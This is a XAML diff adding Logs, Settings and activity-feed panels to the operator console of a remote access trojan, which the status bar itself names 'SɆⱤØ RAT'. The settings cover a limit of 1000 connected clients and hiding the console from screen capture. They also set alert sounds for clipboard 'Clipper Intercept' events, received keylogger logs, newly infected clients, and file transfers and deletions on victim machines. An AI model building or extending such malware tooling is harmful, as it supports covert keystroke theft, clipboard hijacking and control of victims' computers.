+                                        <MenuItem.Icon><TextBlock Text="&#x25BC;" FontSize="10" Foreground="#89b4fa"/></MenuItem.Icon>
+                                    </MenuItem>
+                                </ContextMenu>
+                            </DataGrid.ContextMenu>
                         </DataGrid>
                     </DockPanel>
+                </TabItem>
+
+                <!-- ── Logs ── -->
+                <TabItem x:Name="LogsTabItem">
+                    <TabItem.Header>
+                        <StackPanel Orientation="Horizontal" VerticalAlignment="Center">
+                            <TextBlock Text="≋" Foreground="#606880" FontSize="13" Margin="0,0,5,0" VerticalAlignment="Center"/>
+                            <TextBlock Text="Logs"/>
+                        </StackPanel>
+                    </TabItem.Header>
+                    <Border Margin="8" Padding="4" CornerRadius="8"
+                            Background="#FF000000" BorderThickness="1">
+                        <Border.BorderBrush>
+                            <LinearGradientBrush StartPoint="0,0" EndPoint="0,1">
+                                <GradientStop Color="#283040FF" Offset="0"/>
+                                <GradientStop Color="#121E2038" Offset="1"/>
+                            </LinearGradientBrush>
+                        </Border.BorderBrush>
+                        <DockPanel>
+                            <Grid DockPanel.Dock="Top" Margin="6,4,6,8">
+                                <TextBlock Text="SYSTEM EVENT LOGS" Foreground="#606880" FontSize="11" FontWeight="Bold" FontFamily="Segoe UI" VerticalAlignment="Center" Margin="4,0,0,0"/>
+                                <StackPanel Orientation="Horizontal" HorizontalAlignment="Right" VerticalAlignment="Center">
+                                    <Button Content="CLEAR" Height="22" Padding="10,0" Style="{StaticResource SBtn}" FontSize="10" FontWeight="SemiBold" Click="ClearLogs_Click"/>
+                                </StackPanel>
+                            </Grid>
+                            
+                            <!-- RichTextBox: supports coloured runs AND text selection/copy -->
+                            <RichTextBox x:Name="TxtLogs"
+                                         Background="Transparent" BorderThickness="0"
+                                         FontFamily="Consolas" FontSize="11"
+                                         IsReadOnly="True" IsDocumentEnabled="True"
+                                         VerticalScrollBarVisibility="Auto"
+                                         HorizontalScrollBarVisibility="Disabled"
+                                         ScrollViewer.ScrollChanged="TxtLogs_ScrollChanged"
+                                         Padding="8,6"
+                                         SelectionBrush="#404878" CaretBrush="Transparent">
+                                <RichTextBox.Resources>
+                                    <!-- Remove the default 4px paragraph spacing -->
+                                    <Style TargetType="Paragraph">
+                                        <Setter Property="Margin" Value="0"/>
+                                        <Setter Property="LineHeight" Value="16"/>
+                                    </Style>
+                                </RichTextBox.Resources>
+                            </RichTextBox>
+                        </DockPanel>
+                    </Border>
+                </TabItem>
+
+                <!-- ── Settings ── -->
+                <TabItem>
+                    <TabItem.Header>
+                        <StackPanel Orientation="Horizontal" VerticalAlignment="Center">
+                            <TextBlock Text="⚙" Foreground="#606880" FontSize="11" Margin="0,0,5,0" VerticalAlignment="Center"/>
+                            <TextBlock Text="Settings"/>
+                        </StackPanel>
+                    </TabItem.Header>
+                    <Border Margin="8" CornerRadius="8"
+                            Background="#D0111222" BorderThickness="1">
+                        <Border.BorderBrush>
+                            <LinearGradientBrush StartPoint="0,0" EndPoint="0,1">
+                                <GradientStop Color="#283040FF" Offset="0"/>
+                                <GradientStop Color="#121E2038" Offset="1"/>
+                            </LinearGradientBrush>
+                        </Border.BorderBrush>
+                        <ScrollViewer VerticalScrollBarVisibility="Auto"
+                                      HorizontalScrollBarVisibility="Disabled">
+                            <Grid Margin="24" MaxWidth="1050" HorizontalAlignment="Center">
+                                <Grid.ColumnDefinitions>
+                                    <ColumnDefinition Width="*" MinWidth="340"/>
+                                    <ColumnDefinition Width="40"/>
+                                    <ColumnDefinition Width="*" MinWidth="440"/>
+                                </Grid.ColumnDefinitions>
+
+                                <!-- Left Column: Settings -->
+                                <StackPanel Grid.Column="0">
+                                    <TextBlock Text="SERVER LIMITS" Style="{StaticResource SLabel}" />
+                                    <TextBlock Text="MAX CONNECTED CLIENTS" Style="{StaticResource SFieldLabel}" />
+                                    <StackPanel Orientation="Horizontal" Margin="0,0,0,6">
+                                        <TextBox x:Name="SettingsMaxClients" Style="{StaticResource STxt}" Text="1000" Width="120" />
+                                        <Button Content="APPLY" Height="28" Margin="8,0,0,0" Padding="12,0"
+                                                Style="{StaticResource SGreenBtn}" FontSize="10"
+                                                Click="SettingsApplyMaxClients_Click" />
+                                    </StackPanel>
+                                    <TextBlock Text="Rejects new connections when this limit is reached." Foreground="#606880" FontSize="11" Margin="0,0,0,24" />
+
+                                    <TextBlock Text="INTEGRATIONS" Style="{StaticResource SLabel}" />
+                                    <StackPanel Orientation="Horizontal" Margin="0,0,0,8" VerticalAlignment="Center">
+                                        <CheckBox x:Name="SettingsDiscordRPC" Content="Discord Rich Presence" Style="{StaticResource SChk}" VerticalAlignment="Center" />
+                                        <Button Content="APPLY" Height="22" Margin="12,0,0,0" Padding="10,0"
+                                                Style="{StaticResource SGreenBtn}" FontSize="10"
+                                                Click="SettingsApplyDiscordRPC_Click" />
+                                    </StackPanel>
+                                    <CheckBox x:Name="SettingsNotifySound" Content="Connection notifications (sound + alert)" Style="{StaticResource SChk}" Margin="0,0,0,24"
+                                              Checked="SettingsNotifySound_Changed" Unchecked="SettingsNotifySound_Changed" />
+
+                                    <TextBlock Text="DIAGNOSTICS" Style="{StaticResource SLabel}" />
+                                    <CheckBox x:Name="SettingsDevLogs" Content="Enable diagnostic logging (crashes, disconnections, stream events)"
+                                              Style="{StaticResource SChk}" IsChecked="True" Margin="0,0,0,4"
+                                              Checked="SettingsDevLogs_Changed" Unchecked="SettingsDevLogs_Changed" />
+                                    <StackPanel Orientation="Horizontal" Margin="0,0,0,4">
+                                        <TextBlock x:Name="TxtDevLogsPath" Text="" Foreground="#404878"
+                                                   FontSize="10" FontFamily="Consolas" VerticalAlignment="Center"/>
+                                        <Button Content="Open folder" Margin="10,0,0,0" Height="22" Padding="8,0"
+                                                Style="{StaticResource SBtn}" Click="OpenDiagLogsFolder_Click"/>
+                                    </StackPanel>
+                                    <TextBlock Text="Logs rotate: 5 files × 5 MB — no screenshots or credentials are ever written."
+                                               Foreground="#404060" FontSize="10" Margin="0,0,0,20"/>
+
+                                    <TextBlock Text="APPEARANCE" Style="{StaticResource SLabel}" />
+                                    <CheckBox x:Name="SettingsHideLogo" Content="Hide background logo (dark mode)" Style="{StaticResource SChk}" Margin="0,0,0,8"
+                                              Checked="SettingsHideLogo_Changed" Unchecked="SettingsHideLogo_Changed" />
+                                    <CheckBox x:Name="SettingsShowSeconds" Content="Show seconds in timestamps" Style="{StaticResource SChk}" Margin="0,0,0,8"
+                                              Checked="SettingsShowSeconds_Changed" Unchecked="SettingsShowSeconds_Changed" />
+                                    <CheckBox x:Name="SettingsBlockCapture" Content="Block screen recording (window hidden from OBS / screenshots / RDP)" Style="{StaticResource SChk}" Margin="0,0,0,4"
+                                              Checked="SettingsBlockCapture_Changed" Unchecked="SettingsBlockCapture_Changed" />
+                                    <TextBlock Text="Uses SetWindowDisplayAffinity — window appears black in any capture tool." Foreground="#404060" FontSize="10" Margin="0,0,0,24"/>
+
+                                    <TextBlock Text="PORT CHECKER" Style="{StaticResource SLabel}" />
+                                    <StackPanel Orientation="Horizontal" Margin="0,0,0,8">
+                                        <TextBox x:Name="SettingsCheckIP"   Style="{StaticResource STxt}" Width="160" Text="127.0.0.1" />
+                                        <TextBlock Text=":" Foreground="#606880" FontSize="16" VerticalAlignment="Center" Margin="8,0" />
+                                        <TextBox x:Name="SettingsCheckPort" Style="{StaticResource STxt}" Width="64" Text="7777" />
+                                        <Button Content="CHECK" Height="32" Margin="10,0,0,0" Style="{StaticResource SGreenBtn}" Click="CheckPort_Click" />
+                                        <Button Content="GET IP" Height="32" Margin="8,0,0,0"  Style="{StaticResource SBtn}"      Click="GetMyIP_Click" />
+                                    </StackPanel>
+                                    <TextBlock x:Name="TxtPortResult" Text="" Foreground="#606880" FontSize="12" Margin="0,4,0,24" />
+                                </StackPanel>
+
+                                <!-- Right Column: Sound Preferences -->
+                                <StackPanel Grid.Column="2">
+                                    <TextBlock Text="SOUND PREFERENCES" Style="{StaticResource SLabel}" />
+                                    <Border Background="#0C0D1E" BorderBrush="#1C1E30" BorderThickness="1" CornerRadius="6" Padding="14,10" Margin="0,0,0,24">
+                                        <StackPanel>
+                                            <!-- Header Row -->
+                                            <Grid Margin="0,0,0,8">
+                                                <Grid.ColumnDefinitions>
+                                                    <ColumnDefinition Width="*" />
+                                                    <ColumnDefinition Width="100" />
+                                                    <ColumnDefinition Width="70" />
+                                                </Grid.ColumnDefinitions>
+                                                <TextBlock Grid.Column="0" Text="EVENT / ACTION" Foreground="#4A5270" FontSize="10" FontWeight="Bold"/>
+                                                <TextBlock Grid.Column="1" Text="STATUS" Foreground="#4A5270" FontSize="10" FontWeight="Bold" Margin="4,0,0,0"/>
+                                                <TextBlock Grid.Column="2" Text="PREVIEW" Foreground="#4A5270" FontSize="10" FontWeight="Bold" HorizontalAlignment="Right"/>
+                                            </Grid>
+                                            
+                                            <Rectangle Height="1" Fill="#16182E" Margin="0,0,0,8"/>
+
+                                            <!-- Sound Rows -->
+                                            <Grid Margin="0,4">
+                                                <Grid.ColumnDefinitions>
+                                                    <ColumnDefinition Width="*" />
+                                                    <ColumnDefinition Width="100" />
+                                                    <ColumnDefinition Width="70" />
+                                                </Grid.ColumnDefinitions>
+                                                <TextBlock Grid.Column="0" Text="🚀  Intro / Logo Animation" Foreground="#DDE0F0" VerticalAlignment="Center" FontSize="11"/>
+                                                <CheckBox Grid.Column="1" x:Name="SndChk_Intro" Content="Enabled" Style="{StaticResource SChk}" VerticalAlignment="Center" Checked="SoundSetting_Changed" Unchecked="SoundSetting_Changed"/>
+                                                <Button Grid.Column="2" Content="▶ Play" Style="{StaticResource SBtn}" Height="22" FontSize="10" Click="PreviewSound_Click" Tag="Intro.wav" HorizontalAlignment="Right" Padding="6,0"/>
+                                            </Grid>
+
+                                            <Grid Margin="0,4">
+                                                <Grid.ColumnDefinitions>
+                                                    <ColumnDefinition Width="*" />
+                                                    <ColumnDefinition Width="100" />
+                                                    <ColumnDefinition Width="70" />
+                                                </Grid.ColumnDefinitions>
+                                                <TextBlock Grid.Column="0" Text="🔔  Server Startup" Foreground="#DDE0F0" VerticalAlignment="Center" FontSize="11"/>
+                                                <CheckBox Grid.Column="1" x:Name="SndChk_Startup" Content="Enabled" Style="{StaticResource SChk}" VerticalAlignment="Center" Checked="SoundSetting_Changed" Unchecked="SoundSetting_Changed"/>
+                                                <Button Grid.Column="2" Content="▶ Play" Style="{StaticResource SBtn}" Height="22" FontSize="10" Click="PreviewSound_Click" Tag="01_startup_chime.mp3" HorizontalAlignment="Right" Padding="6,0"/>
+                                            </Grid>
+
+                                            <Grid Margin="0,4">
+                                                <Grid.ColumnDefinitions>
+                                                    <ColumnDefinition Width="*" />
+                                                    <ColumnDefinition Width="100" />
+                                                    <ColumnDefinition Width="70" />
+                                                </Grid.ColumnDefinitions>
+                                                <TextBlock Grid.Column="0" Text="📴  Server Shutdown" Foreground="#DDE0F0" VerticalAlignment="Center" FontSize="11"/>
+                                                <CheckBox Grid.Column="1" x:Name="SndChk_Shutdown" Content="Enabled" Style="{StaticResource SChk}" VerticalAlignment="Center" Checked="SoundSetting_Changed" Unchecked="SoundSetting_Changed"/>
+                                                <Button Grid.Column="2" Content="▶ Play" Style="{StaticResource SBtn}" Height="22" FontSize="10" Click="PreviewSound_Click" Tag="04_shutdown_gentle_descent.mp3" HorizontalAlignment="Right" Padding="6,0"/>
+                                            </Grid>
+
+                                            <Grid Margin="0,4">
+                                                <Grid.ColumnDefinitions>
+                                                    <ColumnDefinition Width="*" />
+                                                    <ColumnDefinition Width="100" />
+                                                    <ColumnDefinition Width="70" />
+                                                </Grid.ColumnDefinitions>
+                                                <TextBlock Grid.Column="0" Text="🖥️  Client Connected" Foreground="#DDE0F0" VerticalAlignment="Center" FontSize="11"/>
+                                                <CheckBox Grid.Column="1" x:Name="SndChk_Connected" Content="Enabled" Style="{StaticResource SChk}" VerticalAlignment="Center" Checked="SoundSetting_Changed" Unchecked="SoundSetting_Changed"/>
+                                                <Button Grid.Column="2" Content="▶ Play" Style="{StaticResource SBtn}" Height="22" FontSize="10" Click="PreviewSound_Click" Tag="34_device_connected.mp3" HorizontalAlignment="Right" Padding="6,0"/>
+                                            </Grid>
+
+                                            <Grid Margin="0,4">
+                                                <Grid.ColumnDefinitions>
+                                                    <ColumnDefinition Width="*" />
+                                                    <ColumnDefinition Width="100" />
+                                                    <ColumnDefinition Width="70" />
+                                                </Grid.ColumnDefinitions>
+                                                <TextBlock Grid.Column="0" Text="✨  New Client (First Seen)" Foreground="#DDE0F0" VerticalAlignment="Center" FontSize="11"/>
+                                                <CheckBox Grid.Column="1" x:Name="SndChk_NewClient" Content="Enabled" Style="{StaticResource SChk}" VerticalAlignment="Center" Checked="SoundSetting_Changed" Unchecked="SoundSetting_Changed"/>
+                                                <Button Grid.Column="2" Content="▶ Play" Style="{StaticResource SBtn}" Height="22" FontSize="10" Click="PreviewSound_Click" Tag="40_8bit_power_up.mp3" HorizontalAlignment="Right" Padding="6,0"/>
+                                            </Grid>
+
+                                            <Grid Margin="0,4">
+                                                <Grid.ColumnDefinitions>
+                                                    <ColumnDefinition Width="*" />
+                                                    <ColumnDefinition Width="100" />
+                                                    <ColumnDefinition Width="70" />
+                                                </Grid.ColumnDefinitions>
+                                                <TextBlock Grid.Column="0" Text="🔌  Client Disconnected" Foreground="#DDE0F0" VerticalAlignment="Center" FontSize="11"/>
+                                                <CheckBox Grid.Column="1" x:Name="SndChk_Disconnected" Content="Enabled" Style="{StaticResource SChk}" VerticalAlignment="Center" Checked="SoundSetting_Changed" Unchecked="SoundSetting_Changed"/>
+                                                <Button Grid.Column="2" Content="▶ Play" Style="{StaticResource SBtn}" Height="22" FontSize="10" Click="PreviewSound_Click" Tag="35_device_disconnected.mp3" HorizontalAlignment="Right" Padding="6,0"/>
+                                            </Grid>
+
+                                            <Grid Margin="0,4">
+                                                <Grid.ColumnDefinitions>
+                                                    <ColumnDefinition Width="*" />
+                                                    <ColumnDefinition Width="100" />
+                                                    <ColumnDefinition Width="70" />
+                                                </Grid.ColumnDefinitions>
+                                                <TextBlock Grid.Column="0" Text="✅  Build Success" Foreground="#DDE0F0" VerticalAlignment="Center" FontSize="11"/>
+                                                <CheckBox Grid.Column="1" x:Name="SndChk_BuildSuccess" Content="Enabled" Style="{StaticResource SChk}" VerticalAlignment="Center" Checked="SoundSetting_Changed" Unchecked="SoundSetting_Changed"/>
+                                                <Button Grid.Column="2" Content="▶ Play" Style="{StaticResource SBtn}" Height="22" FontSize="10" Click="PreviewSound_Click" Tag="11_success_bright.mp3" HorizontalAlignment="Right" Padding="6,0"/>
+                                            </Grid>
+
+                                            <Grid Margin="0,4">
+                                                <Grid.ColumnDefinitions>
+                                                    <ColumnDefinition Width="*" />
+                                                    <ColumnDefinition Width="100" />
+                                                    <ColumnDefinition Width="70" />
+                                                </Grid.ColumnDefinitions>
+                                                <TextBlock Grid.Column="0" Text="❌  Build Error" Foreground="#DDE0F0" VerticalAlignment="Center" FontSize="11"/>
+                                                <CheckBox Grid.Column="1" x:Name="SndChk_BuildError" Content="Enabled" Style="{StaticResource SChk}" VerticalAlignment="Center" Checked="SoundSetting_Changed" Unchecked="SoundSetting_Changed"/>
+                                                <Button Grid.Column="2" Content="▶ Play" Style="{StaticResource SBtn}" Height="22" FontSize="10" Click="PreviewSound_Click" Tag="13_error_buzz.mp3" HorizontalAlignment="Right" Padding="6,0"/>
+                                            </Grid>
+
+                                            <Grid Margin="0,4">
+                                                <Grid.ColumnDefinitions>
+                                                    <ColumnDefinition Width="*" />
+                                                    <ColumnDefinition Width="100" />
+                                                    <ColumnDefinition Width="70" />
+                                                </Grid.ColumnDefinitions>
+                                                <TextBlock Grid.Column="0" Text="🪙  Clipper Intercept" Foreground="#DDE0F0" VerticalAlignment="Center" FontSize="11"/>
+                                                <CheckBox Grid.Column="1" x:Name="SndChk_Clipper" Content="Enabled" Style="{StaticResource SChk}" VerticalAlignment="Center" Checked="SoundSetting_Changed" Unchecked="SoundSetting_Changed"/>
+                                                <Button Grid.Column="2" Content="▶ Play" Style="{StaticResource SBtn}" Height="22" FontSize="10" Click="PreviewSound_Click" Tag="41_8bit_coin_collect.mp3" HorizontalAlignment="Right" Padding="6,0"/>
+                                            </Grid>
+
+                                            <Grid Margin="0,4">
+                                                <Grid.ColumnDefinitions>
+                                                    <ColumnDefinition Width="*" />
+                                                    <ColumnDefinition Width="100" />
+                                                    <ColumnDefinition Width="70" />
+                                                </Grid.ColumnDefinitions>
+                                                <TextBlock Grid.Column="0" Text="📬  Keylogger Logs Received" Foreground="#DDE0F0" VerticalAlignment="Center" FontSize="11"/>
+                                                <CheckBox Grid.Column="1" x:Name="SndChk_Keylogger" Content="Enabled" Style="{StaticResource SChk}" VerticalAlignment="Center" Checked="SoundSetting_Changed" Unchecked="SoundSetting_Changed"/>
+                                                <Button Grid.Column="2" Content="▶ Play" Style="{StaticResource SBtn}" Height="22" FontSize="10" Click="PreviewSound_Click" Tag="45_mail_chime.mp3" HorizontalAlignment="Right" Padding="6,0"/>
+                                            </Grid>
+
+                                            <Grid Margin="0,4">
+                                                <Grid.ColumnDefinitions>
+                                                    <ColumnDefinition Width="*" />
+                                                    <ColumnDefinition Width="100" />
+                                                    <ColumnDefinition Width="70" />
+                                                </Grid.ColumnDefinitions>
+                                                <TextBlock Grid.Column="0" Text="🔍  AutoTask Completed" Foreground="#DDE0F0" VerticalAlignment="Center" FontSize="11"/>
+                                                <CheckBox Grid.Column="1" x:Name="SndChk_AutoTask" Content="Enabled" Style="{StaticResource SChk}" VerticalAlignment="Center" Checked="SoundSetting_Changed" Unchecked="SoundSetting_Changed"/>
+                                                <Button Grid.Column="2" Content="▶ Play" Style="{StaticResource SBtn}" Height="22" FontSize="10" Click="PreviewSound_Click" Tag="20_scan_complete.mp3" HorizontalAlignment="Right" Padding="6,0"/>
+                                            </Grid>
+
+                                            <Grid Margin="0,4">
+                                                <Grid.ColumnDefinitions>
+                                                    <ColumnDefinition Width="*" />
+                                                    <ColumnDefinition Width="100" />
+                                                    <ColumnDefinition Width="70" />
+                                                </Grid.ColumnDefinitions>
+                                                <TextBlock Grid.Column="0" Text="📥  File Downloaded" Foreground="#DDE0F0" VerticalAlignment="Center" FontSize="11"/>
+                                                <CheckBox Grid.Column="1" x:Name="SndChk_Download" Content="Enabled" Style="{StaticResource SChk}" VerticalAlignment="Center" Checked="SoundSetting_Changed" Unchecked="SoundSetting_Changed"/>
+                                                <Button Grid.Column="2" Content="▶ Play" Style="{StaticResource SBtn}" Height="22" FontSize="10" Click="PreviewSound_Click" Tag="26_download_complete.mp3" HorizontalAlignment="Right" Padding="6,0"/>
+                                            </Grid>
+
+                                            <Grid Margin="0,4">
+                                                <Grid.ColumnDefinitions>
+                                                    <ColumnDefinition Width="*" />
+                                                    <ColumnDefinition Width="100" />
+                                                    <ColumnDefinition Width="70" />
+                                                </Grid.ColumnDefinitions>
+                                                <TextBlock Grid.Column="0" Text="📤  File Uploaded" Foreground="#DDE0F0" VerticalAlignment="Center" FontSize="11"/>
+                                                <CheckBox Grid.Column="1" x:Name="SndChk_Upload" Content="Enabled" Style="{StaticResource SChk}" VerticalAlignment="Center" Checked="SoundSetting_Changed" Unchecked="SoundSetting_Changed"/>
+                                                <Button Grid.Column="2" Content="▶ Play" Style="{StaticResource SBtn}" Height="22" FontSize="10" Click="PreviewSound_Click" Tag="27_upload_complete.mp3" HorizontalAlignment="Right" Padding="6,0"/>
+                                            </Grid>
+
+                                            <Grid Margin="0,4">
+                                                <Grid.ColumnDefinitions>
+                                                    <ColumnDefinition Width="*" />
+                                                    <ColumnDefinition Width="100" />
+                                                    <ColumnDefinition Width="70" />
+                                                </Grid.ColumnDefinitions>
+                                                <TextBlock Grid.Column="0" Text="🗑️  File Deleted" Foreground="#DDE0F0" VerticalAlignment="Center" FontSize="11"/>
+                                                <CheckBox Grid.Column="1" x:Name="SndChk_FileDelete" Content="Enabled" Style="{StaticResource SChk}" VerticalAlignment="Center" Checked="SoundSetting_Changed" Unchecked="SoundSetting_Changed"/>
+                                                <Button Grid.Column="2" Content="▶ Play" Style="{StaticResource SBtn}" Height="22" FontSize="10" Click="PreviewSound_Click" Tag="23_file_deletion.mp3" HorizontalAlignment="Right" Padding="6,0"/>
+                                            </Grid>
+                                        </StackPanel>
+                                    </Border>
+                                </StackPanel>
+                            </Grid>
+                        </ScrollViewer>
+                    </Border>
                 </TabItem>
 
                 <!-- ── About ── -->
@@ -2308,14 +2613,12 @@
                         </ScrollViewer>
                     </Border>
                 </TabItem>
-
-
             </TabControl>
 
-            <!-- ── Status bar ─────────────────────────────────────── -->
+            <!-- ── Activity panel ────────────────────────────────── -->
             <Border Grid.Row="4" Background="#C0111222"
                     BorderThickness="0,1,0,0"
-                    CornerRadius="0,0,10,10" Padding="16,0">
+                    CornerRadius="0,0,10,10" Padding="16,8">
                 <Border.BorderBrush>
                     <LinearGradientBrush StartPoint="0,0" EndPoint="1,0">
                         <GradientStop Color="#281E2038" Offset="0"/>
@@ -2324,15 +2627,28 @@
                     </LinearGradientBrush>
                 </Border.BorderBrush>
                 <Grid>
-                    <Grid.ColumnDefinitions>
-                        <ColumnDefinition Width="*" />
-                        <ColumnDefinition Width="Auto" />
-                    </Grid.ColumnDefinitions>
-                    <TextBlock Grid.Column="0" x:Name="TxtStatusLeft" Text="SɆⱤØ RAT" Foreground="#2E3048"
-                               FontSize="10" FontWeight="SemiBold" VerticalAlignment="Center" />
-                    <TextBlock x:Name="TxtStatusBar" Grid.Column="1" Text="Ready"
-                               Foreground="#606880" FontSize="11" VerticalAlignment="Center"
-                               HorizontalAlignment="Right"/>
+                    <Grid.RowDefinitions>
+                        <RowDefinition Height="Auto"/>
+                        <RowDefinition Height="*"/>
+                    </Grid.RowDefinitions>
+                    <!-- Top row: server info + current action -->
+                    <Grid Grid.Row="0" Margin="0,0,0,4">
+                        <Grid.ColumnDefinitions>
+                            <ColumnDefinition Width="*" />
+                            <ColumnDefinition Width="Auto" />
+                        </Grid.ColumnDefinitions>
+                        <TextBlock Grid.Column="0" Text="ACTIVITY LOG" Foreground="#4A5270"
+                                   FontSize="10" FontWeight="SemiBold" VerticalAlignment="Center" />
+                        <TextBlock Grid.Column="1" x:Name="TxtStatusBar" Text="Ready"
+                                   Foreground="#94A3B8" FontSize="10" VerticalAlignment="Center"
+                                   HorizontalAlignment="Right" TextTrimming="CharacterEllipsis"/>
+                    </Grid>
+                    <!-- Bottom row: recent activity feed -->
+                    <Border Grid.Row="1" Background="#0A0B10" CornerRadius="3" Padding="2" BorderThickness="1" BorderBrush="#111E2038">
+                        <ScrollViewer x:Name="ActivityLogScroll" VerticalScrollBarVisibility="Auto" HorizontalScrollBarVisibility="Disabled" ScrollChanged="ActivityLogScroll_ScrollChanged">
+                            <StackPanel x:Name="ActivityFeedPanel" Margin="4"/>
+                        </ScrollViewer>
+                    </Border>
                 </Grid>
             </Border>
         </Grid>
